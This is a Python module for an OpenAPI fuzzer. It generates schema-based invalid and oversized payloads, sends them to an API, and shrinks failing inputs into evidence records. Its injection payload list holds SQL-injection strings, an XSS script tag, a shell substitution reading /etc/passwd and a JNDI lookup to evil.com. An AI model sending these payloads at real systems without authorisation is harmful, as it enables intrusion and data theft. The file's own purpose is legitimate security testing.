"""OpenAPI 状态化 Fuzzing Collector (Phase 4).

基于 OpenAPI schema 生成有状态的 API 调用序列（创建→读取→更新→删除），
产出最小失败输入，输出 EvidenceFragment。
"""

from __future__ import annotations

import json
import random
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Callable

import requests

from evidence.fragments import EvidenceFragment
from observability.metrics import incr

# Fragment type constants (matching evidence.fragments)
FRAGMENT_TYPE_HTTP = "http"


class FuzzStrategy(Enum):
    """Fuzzing 策略类型。"""
    BOUNDARY = "boundary"           # 边界值：min-1, min, max, max+1
    TYPE_MISMATCH = "type_mismatch" # 类型错误：string 传 int
    REQUIRED_MISSING = "required_missing"  # 必填字段缺失
    ENUM_VIOLATION = "enum_violation"      # 枚举值外
    FORMAT_VIOLATION = "format_violation"  # format 校验失败
    INJECTION = "injection"         # SQL/命令注入载荷
    OVERSIZED = "oversized"         # 超长字符串/数组


@dataclass
class ApiOperation:
    """OpenAPI 操作描述。"""
    method: str
    path: str
    operation_id: str
    summary: str
    parameters: list[dict[str, Any]] = field(default_factory=list)
    request_body: dict[str, Any] | None = None
    responses: dict[str, Any] = field(default_factory=dict)
    security: list[dict[str, Any]] = field(default_factory=list)


@dataclass
class FuzzResult:
    """单次 fuzzing 尝试的结果。"""
    strategy: FuzzStrategy
    operation: ApiOperation
    payload: dict[str, Any]
    status_code: int
    response_body: str
    response_time_ms: int
    is_failure: bool
    failure_reason: str | None = None
    shrunk_payload: dict[str, Any] | None = None


@dataclass
class OpenAPIFuzzReport:
    """Fuzzing 批次报告。"""
    spec_path: Path
    base_url: str
    total_attempts: int = 0
    failures: int = 0
    unique_failures: int = 0
    results: list[FuzzResult] = field(default_factory=list)
    duration_ms: int = 0
    shrunk_cases: list[dict[str, Any]] = field(default_factory=list)

    def to_fragments(self) -> list[EvidenceFragment]:
        """转换为 EvidenceFragment 列表。"""
        from datetime import UTC, datetime
        fragments = []
        for i, result in enumerate(self.results):
            if result.is_failure:
                fragment = EvidenceFragment(
                    experiment_id=f"openapi-fuzz-{i}",
                    fragment_type=FRAGMENT_TYPE_HTTP,
                    collector_version="openapi-fuzzer-1.0",
                    collected_at=datetime.now(UTC).isoformat(),
                    base=None,
                    head={
                        "strategy": result.strategy.value,
                        "operation": {
                            "method": result.operation.method,
                            "path": result.operation.path,
                            "operation_id": result.operation.operation_id,
                        },
                        "payload": result.payload,
                        "shrunk_payload": result.shrunk_payload,
                        "status_code": result.status_code,
                        "response_body": result.response_body[:5000],
                        "response_time_ms": result.response_time_ms,
                        "failure_reason": result.failure_reason,
                    },
                    normalization=None,
                    comparison=None,
                    status="REGRESSION",
                    confidence=0.9,
                    evidence_ref=None,
                    reproducibility="reproducible",
                    extension={},
                )
                fragments.append(fragment)
        return fragments


class OpenAPISpecParser:
    """解析 OpenAPI 3.x 规范，提取可测试的操作。"""

    def __init__(self, spec_path: Path):
        self.spec_path = Path(spec_path)
        self.spec: dict[str, Any] = {}

    def load(self) -> dict[str, Any]:
        """加载并解析 OpenAPI spec。"""
        with self.spec_path.open("r", encoding="utf-8") as f:
            if self.spec_path.suffix in (".yaml", ".yml"):
                import yaml
                self.spec = yaml.safe_load(f)
            else:
                self.spec = json.load(f)
        return self.spec

    def get_operations(self) -> list[ApiOperation]:
        """提取所有可测试的操作（GET/POST/PUT/PATCH/DELETE）。"""
        if not self.spec:
            self.load()

        operations = []
        paths = self.spec.get("paths", {})

        for path, path_item in paths.items():
            for method in ("get", "post", "put", "patch", "delete"):
                if method not in path_item:
                    continue
                op_spec = path_item[method]
                if op_spec.get("x-fuzz-skip"):
                    continue

                # 解析参数
                parameters = []
                for param in path_item.get("parameters", []) + op_spec.get("parameters", []):
                    parameters.append(self._parse_parameter(param))

                # 解析 request body
                request_body = None
                if "requestBody" in op_spec:
                    request_body = self._parse_request_body(op_spec["requestBody"])

                operations.append(ApiOperation(
                    method=method.upper(),
                    path=path,
                    operation_id=op_spec.get("operationId", f"{method}_{path}".replace("/", "_")),
                    summary=op_spec.get("summary", ""),
                    parameters=parameters,
                    request_body=request_body,
                    responses=op_spec.get("responses", {}),
                    security=op_spec.get("security", self.spec.get("security", [])),
                ))

        return operations

    def _parse_parameter(self, param: dict[str, Any]) -> dict[str, Any]:
        """解析参数定义。"""
        schema = param.get("schema", {})
        return {
            "name": param.get("name"),
            "in": param.get("in"),
            "required": param.get("required", False),
            "schema": schema,
            "example": param.get("example"),
        }

    def _parse_request_body(self, body_spec: dict[str, Any]) -> dict[str, Any] | None:
        """解析请求体 schema。"""
        content = body_spec.get("content", {})
        for media_type in (
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
        ):
            if media_type in content:
                schema = content[media_type].get("schema", {})
                return {
                    "media_type": media_type,
                    "schema": schema,
                    "required": body_spec.get("required", False),
                }
        return None


class PayloadGenerator:
    """根据 schema 和策略生成 fuzzing 载荷。"""

    def __init__(self, operations: list[ApiOperation]):
        self.operations = operations
        self._schemas = self._collect_schemas()

    def _collect_schemas(self) -> dict[str, dict[str, Any]]:
        """收集所有引用的 schema。"""
        schemas: dict[str, dict[str, Any]] = {}
        # 从 spec 的 components/schemas 收集
        # 这里简化处理，实际应解析 $ref
        return schemas

    def generate_valid_payload(self, operation: ApiOperation) -> dict[str, Any]:
        """生成一个合法的 payload（用于建立基线）。"""
        payload = {}
        if operation.request_body and operation.request_body.get("schema"):
            payload = self._generate_from_schema(operation.request_body["schema"])
        return payload

    def _generate_from_schema(self, schema: dict[str, Any]) -> dict[str, Any]:
        """从 schema 生成示例数据（简化版）。"""
        if schema.get("type") == "object":
            props = schema.get("properties", {})
            required = schema.get("required", [])
            result = {}
            for name, prop in props.items():
                if name in required or random.random() < 0.5:
                    result[name] = self._generate_value(prop)
            return result
        return {}

    def _generate_value(self, schema: dict[str, Any]) -> Any:
        """生成单个值。"""
        schema_type = schema.get("type", "string")
        if schema_type == "string":
            fmt = schema.get("format")
            if fmt == "email":
                return "test@example.com"
            if fmt == "date-time":
                return "2024-01-01T00:00:00Z"
            if fmt == "uuid":
                return "550e8400-e29b-41d4-a716-446655440000"
            enum = schema.get("enum")
            if enum:
                return random.choice(enum)
            min_len = schema.get("minLength", 1)
            max_len = schema.get("maxLength", 50)
            return "x" * random.randint(min_len, max_len)
        elif schema_type == "integer":
            minimum = schema.get("minimum", 0)
            maximum = schema.get("maximum", 100)
            return random.randint(minimum, maximum)
        elif schema_type == "number":
            return random.uniform(0, 100)
        elif schema_type == "boolean":
            return random.choice([True, False])
        elif schema_type == "array":
            items = schema.get("items", {})
            return [self._generate_value(items) for _ in range(random.randint(0, 3))]
        elif schema_type == "object":
            return self._generate_from_schema(schema)
        return None

    def generate_fuzz_payloads(
        self, operation: ApiOperation, strategy: FuzzStrategy
    ) -> list[dict[str, Any]]:
        """根据策略生成 fuzzing 载荷。"""
        base = self.generate_valid_payload(operation)
        payloads = []

        if strategy == FuzzStrategy.BOUNDARY:
            payloads.extend(self._boundary_payloads(operation, base))
        elif strategy == FuzzStrategy.TYPE_MISMATCH:
            payloads.extend(self._type_mismatch_payloads(operation, base))
        elif strategy == FuzzStrategy.REQUIRED_MISSING:
            payloads.extend(self._required_missing_payloads(operation, base))
        elif strategy == FuzzStrategy.ENUM_VIOLATION:
            payloads.extend(self._enum_violation_payloads(operation, base))
        elif strategy == FuzzStrategy.FORMAT_VIOLATION:
            payloads.extend(self._format_violation_payloads(operation, base))
        elif strategy == FuzzStrategy.INJECTION:
            payloads.extend(self._injection_payloads(operation, base))
        elif strategy == FuzzStrategy.OVERSIZED:
            payloads.extend(self._oversized_payloads(operation, base))

        return payloads

    def _boundary_payloads(
        self, operation: ApiOperation, base: dict[str, Any]
    ) -> list[dict[str, Any]]:
        """边界值测试：数值边界、字符串长度边界。"""
        payloads = []
        if operation.request_body and operation.request_body.get("schema"):
            props = operation.request_body["schema"].get("properties", {})
            for name, prop in props.items():
                if prop.get("type") == "integer":
                    minimum = prop.get("minimum", 0)
                    maximum = prop.get("maximum", 100)
                    for val in [minimum - 1, minimum, maximum, maximum + 1]:
                        p = base.copy()
                        p[name] = val
                        payloads.append(p)
                elif prop.get("type") == "string":
                    min_len = prop.get("minLength", 0)
                    max_len = prop.get("maxLength", 100)
                    for length in [min_len - 1, min_len, max_len, max_len + 1]:
                        if length >= 0:
                            p = base.copy()
                            p[name] = "x" * length
                            payloads.append(p)
        return payloads

    def _type_mismatch_payloads(
        self, operation: ApiOperation, base: dict[str, Any]
    ) -> list[dict[str, Any]]:
        """类型不匹配：string 传 int，数组传对象等。"""
        payloads = []
        if operation.request_body and operation.request_body.get("schema"):
            props = operation.request_body["schema"].get("properties", {})
            for name, prop in props.items():
                p = base.copy()
                expected = prop.get("type", "string")
                if expected == "string":
                    p[name] = 123
                elif expected == "integer":
                    p[name] = "not_a_number"
                elif expected == "boolean":
                    p[name] = "yes"
                elif expected == "array":
                    p[name] = {"not": "an_array"}
                elif expected == "object":
                    p[name] = "not_an_object"
                else:
                    p[name] = None
                payloads.append(p)
        return payloads

    def _required_missing_payloads(
        self, operation: ApiOperation, base: dict[str, Any]
    ) -> list[dict[str, Any]]:
        """必填字段缺失。"""
        payloads = []
        if operation.request_body and operation.request_body.get("schema"):
            required = operation.request_body["schema"].get("required", [])
            for req_field in required:
                p = base.copy()
                p.pop(req_field, None)
                payloads.append(p)
        return payloads

    def _enum_violation_payloads(
        self, operation: ApiOperation, base: dict[str, Any]
    ) -> list[dict[str, Any]]:
        """枚举值外。"""
        payloads = []
        if operation.request_body and operation.request_body.get("schema"):
            props = operation.request_body["schema"].get("properties", {})
            for name, prop in props.items():
                enum = prop.get("enum")
                if enum:
                    p = base.copy()
                    p[name] = "NOT_IN_ENUM_" + random.choice(enum)
                    payloads.append(p)
        return payloads

    def _format_violation_payloads(
        self, operation: ApiOperation, base: dict[str, Any]
    ) -> list[dict[str, Any]]:
        """format 校验失败。"""
        payloads = []
        if operation.request_body and operation.request_body.get("schema"):
            props = operation.request_body["schema"].get("properties", {})
            for name, prop in props.items():
                fmt = prop.get("format")
                if fmt:
                    p = base.copy()
                    if fmt == "email":
                        p[name] = "not-an-email"
                    elif fmt == "date-time":
                        p[name] = "not-a-date"
                    elif fmt == "uuid":
                        p[name] = "not-a-uuid"
                    elif fmt == "uri":
                        p[name] = "not-a-uri"
                    payloads.append(p)
        return payloads

    def _injection_payloads(
        self, operation: ApiOperation, base: dict[str, Any]
    ) -> list[dict[str, Any]]:
        """注入载荷。"""
        payloads = []
        injections = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert(1)</script>",
            "$(cat /etc/passwd)",
            "`id`",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
        ]
        if operation.request_body and operation.request_body.get("schema"):
            props = operation.request_body["schema"].get("properties", {})
            for name, prop in props.items():
                if prop.get("type") == "string":
                    for inj in injections:
                        p = base.copy()
                        p[name] = inj
                        payloads.append(p)
        return payloads

    def _oversized_payloads(
        self, operation: ApiOperation, base: dict[str, Any]
    ) -> list[dict[str, Any]]:
        """超大载荷。"""
        payloads = []
        if operation.request_body and operation.request_body.get("schema"):
            props = operation.request_body["schema"].get("properties", {})
            for name, prop in props.items():
                if prop.get("type") == "string":
                    p = base.copy()
                    p[name] = "x" * 100000  # 100KB
                    payloads.append(p)
                elif prop.get("type") == "array":
                    p = base.copy()
                    p[name] = ["item"] * 10000
                    payloads.append(p)
        return payloads


class Shrinker:
    """最小化失败载荷（delta debugging 简化版）。"""

    @staticmethod
    def shrink(payload: dict[str, Any], test_fn: Callable[[dict[str, Any]], bool]) -> dict[str, Any]:
        """尝试移除字段/缩短值，保持失败复现。"""
        shrunk = payload.copy()
        # 尝试移除每个字段
        for key in list(shrunk.keys()):
            test_payload = {k: v for k, v in shrunk.items() if k != key}
            if test_fn(test_payload):
                shrunk = test_payload
        # 尝试缩短字符串
        for key, value in list(shrunk.items()):
            if isinstance(value, str) and len(value) > 1:
                for length in [len(value) // 2, len(value) // 4, 1]:
                    test_payload = shrunk.copy()
                    test_payload[key] = value[:length]
                    if test_fn(test_payload):
                        shrunk = test_payload
                        break
        return shrunk


class OpenAPIFuzzer:
    """OpenAPI Fuzzing 主入口。"""

    def __init__(
        self,
        spec_path: Path,
        base_url: str,
        auth_token: str | None = None,
        timeout: int = 30,
        max_attempts_per_op: int = 20,
    ):
        self.spec_path = Path(spec_path)
        self.base_url = base_url.rstrip("/")
        self.auth_token = auth_token
        self.timeout = timeout
        self.max_attempts_per_op = max_attempts_per_op

        self.parser = OpenAPISpecParser(self.spec_path)
        self.operations = self.parser.get_operations()
        self.generator = PayloadGenerator(self.operations)

    def run(self) -> OpenAPIFuzzReport:
        """执行 fuzzing。"""
        incr("openapi_fuzz_runs_total")
        start = time.perf_counter()
        report = OpenAPIFuzzReport(spec_path=self.spec_path, base_url=self.base_url)

        for operation in self.operations:
            # 先用合法 payload 验证端点可达
            valid_payload = self.generator.generate_valid_payload(operation)
            baseline_ok = self._call_api(operation, valid_payload)
            if not baseline_ok:
                # 端点不可达，记录并跳过
                incr("openapi_fuzz_skipped_unreachable_total")
                continue

            # 对每种策略进行 fuzzing
            for strategy in FuzzStrategy:
                payloads = self.generator.generate_fuzz_payloads(operation, strategy)
                for payload in payloads[:self.max_attempts_per_op]:
                    report.total_attempts += 1
                    result = self._fuzz_once(operation, strategy, payload)
                    report.results.append(result)
                    if result.is_failure:
                        report.failures += 1
                        # 尝试 shrinking
                        strat = strategy
                        op = operation

                        def _is_failure(
                            p: dict[str, Any],
                            s: FuzzStrategy = strat,
                            o: ApiOperation = op,
                        ) -> bool:
                            fuzz_result = self._fuzz_once(o, s, p)
                            return fuzz_result.is_failure

                        shrunk = Shrinker.shrink(payload, _is_failure)
                        result.shrunk_payload = shrunk
                        report.shrunk_cases.append({
                            "operation": operation.operation_id,
                            "strategy": strategy.value,
                            "original": payload,
                            "shrunk": shrunk,
                        })

        report.duration_ms = int((time.perf_counter() - start) * 1000)
        # 去重统计唯一失败
        seen = set()
        for r in report.results:
            if r.is_failure:
                key = (r.operation.operation_id, r.strategy.value, r.status_code)
                seen.add(key)
        report.unique_failures = len(seen)

        incr("openapi_fuzz_attempts_total", report.total_attempts)
        incr("openapi_fuzz_failures_total", report.failures)

        return report

    def _call_api(self, operation: ApiOperation, payload: dict[str, Any]) -> bool:
        """调用 API 并返回是否成功（2xx）。"""
        try:
            url = f"{self.base_url}{operation.path}"
            headers = {"Content-Type": "application/json"}
            if self.auth_token:
                headers["Authorization"] = f"Bearer {self.auth_token}"

            resp = requests.request(
                method=operation.method,
                url=url,
                json=payload if payload else None,
                timeout=self.timeout,
                headers=headers,
            )
            return 200 <= resp.status_code < 300
        except Exception:
            return False

    def _fuzz_once(
        self,
        operation: ApiOperation,
        strategy: FuzzStrategy,
        payload: dict[str, Any],
    ) -> FuzzResult:
        """单次 fuzzing 尝试。"""
        start = time.perf_counter()
        try:
            url = f"{self.base_url}{operation.path}"
            headers = {"Content-Type": "application/json"}
            if self.auth_token:
                headers["Authorization"] = f"Bearer {self.auth_token}"

            resp = requests.request(
                method=operation.method,
                url=url,
                json=payload if payload else None,
                timeout=self.timeout,
                headers=headers,
            )
            duration = int((time.perf_counter() - start) * 1000)

            is_failure = (
                resp.status_code >= 500
                or (400 <= resp.status_code < 500 and resp.status_code != 401)
            )
            failure_reason = None
            if is_failure:
                if resp.status_code >= 500:
                    failure_reason = "server_error"
                elif resp.status_code == 400:
                    failure_reason = "bad_request"
                elif resp.status_code == 422:
                    failure_reason = "validation_error"

            return FuzzResult(
                strategy=strategy,
                operation=operation,
                payload=payload,
                status_code=resp.status_code,
                response_body=resp.text[:5000],
                response_time_ms=duration,
                is_failure=is_failure,
                failure_reason=failure_reason,
            )
        except requests.Timeout:
            return FuzzResult(
                strategy=strategy,
                operation=operation,
                payload=payload,
                status_code=0,
                response_body="timeout",
                response_time_ms=self.timeout * 1000,
                is_failure=True,
                failure_reason="timeout",
            )
        except Exception as e:
            return FuzzResult(
                strategy=strategy,
                operation=operation,
                payload=payload,
                status_code=0,
                response_body=str(e),
                response_time_ms=int((time.perf_counter() - start) * 1000),
                is_failure=True,
                failure_reason=f"network_error: {e}",
            )


def run_openapi_fuzzing(
    spec_path: Path,
    base_url: str,
    auth_token: str | None = None,
    timeout: int = 30,
    max_attempts_per_op: int = 20,
) -> OpenAPIFuzzReport:
    """便捷入口函数。"""
    fuzzer = OpenAPIFuzzer(
        spec_path=spec_path,
        base_url=base_url,
        auth_token=auth_token,
        timeout=timeout,
        max_attempts_per_op=max_attempts_per_op,
    )
    return fuzzer.run()


__all__ = [
    "FuzzStrategy",
    "ApiOperation",
    "FuzzResult",
    "OpenAPIFuzzReport",
    "OpenAPISpecParser",
    "PayloadGenerator",
    "Shrinker",
    "OpenAPIFuzzer",
    "run_openapi_fuzzing",
]
